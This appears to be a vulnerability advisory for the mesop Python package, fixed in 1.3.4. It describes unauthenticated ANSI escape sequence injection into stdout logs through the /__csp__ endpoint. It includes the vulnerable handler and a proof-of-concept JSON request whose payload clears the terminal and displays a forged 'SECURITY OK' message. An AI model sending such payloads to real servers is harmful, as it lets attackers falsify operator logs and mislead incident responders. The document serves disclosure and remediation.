@@ -1,0 +1,89 @@
+PYSEC-2026-4105 PyPI/mesop — Mesop: Unauthenticated ANSI Escape Sequence Injection in CSP Reporting Endpoint
+package: mesop
+ecosystem: PyPI
+versions affected:
+  >= 0, < 1.3.4 (ECOSYSTEM)
+aliases: CVE-2026-93421, GHSA-g7f6-rxc4-qhph
+references:
+  https://github.com/mesop-dev/mesop/security/advisories/GHSA-g7f6-rxc4-qhph
+  https://github.com/mesop-dev/mesop/pull/1397
+  https://github.com/mesop-dev/mesop/commit/f38c42a1d3eba246941ef8d7f645072d53c58785
+  https://github.com/mesop-dev/mesop
+  https://github.com/mesop-dev/mesop/releases/tag/v1.3.4
+  https://pypi.org/project/mesop
+  https://github.com/advisories/GHSA-g7f6-rxc4-qhph
+  https://nvd.nist.gov/vuln/detail/CVE-2026-93421
+
+### Summary
+
+The `/__csp__` endpoint accepts unauthenticated JSON reports and logs user-controlled values directly to stdout using `print()` without escaping control characters.
+
+A remote attacker can include ANSI/VT100 escape sequences in fields such as `blocked-uri` or `document-uri`. When the logs are viewed in an ANSI-capable terminal, these sequences can manipulate the displayed output (e.g., clear the screen, hide text, or inject misleading messages), affecting the integrity of operator-facing logs.
+
+### Details
+
+The CSP reporting endpoint accepts arbitrary JSON and prints several request fields directly:
+
+mesop/server/static_file_serving.py
+```python
+@app.route(prefix_base_url("/__csp__"), methods=["POST"])
+def csp_report():
+    report = request.get_json(force=True)
+
+    document_uri = report["csp-report"]["document-uri"]
+    blocked_uri = report["csp-report"]["blocked-uri"]
+    violated_directive = report["csp-report"]["violated-directive"]
+
+    print(f"... Blocked URL: {blocked_uri} ...")
+```
+
+Since these values are written to stdout without sanitization, ANSI escape sequences supplied by a remote client are preserved and interpreted by ANSI-compatible terminals.
+
+### PoC
+
+Send the following request:
+
+```http
+POST /__csp__
+Content-Type: application/json
+
+{
+  "csp-report": {
+    "document-uri": "https://victim.example",
+    "blocked-uri": "\u001b[2J\u001b[H\u001b[32m*** SECURITY OK - No CSP violations found ***\u001b[0m\n\u001b[8mhttps://evil.example",
+    "violated-directive": "script-src-elem"
+  }
+}
+```
+
+The request is accepted (HTTP 204), and the injected escape sequences are written to stdout unchanged.
+
+When the captured output is rendered in a VT100-compatible terminal (verified using `pyte`), the original CSP warning is visually replaced with attacker-controlled content.
+
+**Expected output**
+
+```text
+    Content Security Policy Error
+
+Directive: script-src-elem
+Blocked URL: ...
+App path: /app
+```
+
+**Rendered output**
+
+```text
+*** SECURITY OK - No CSP violations found ***
+https://evil.example
+App path: /app
+```
+
+### Impact
+
+An unauthenticated remote attacker can submit a crafted request to the /__csp__ endpoint containing ANSI/VT100 escape sequences. Because these values are written directly to stdout without sanitization, an attacker can:
+
+1. Inject forged log messages that appear to originate from the application.
+2. Manipulate the terminal display by clearing the screen, moving the cursor, or overwriting previously displayed log output.
+3. Hide or disguise security-relevant log entries using terminal formatting sequences such as colors, hidden text, or cursor positioning.
+4. Mislead administrators during monitoring or incident response by displaying attacker-controlled messages (e.g., fake "SECURITY OK" notifications).
+5. Reduce the integrity and trustworthiness of operator-facing logs, making troubleshooting and security investigations less reliable.
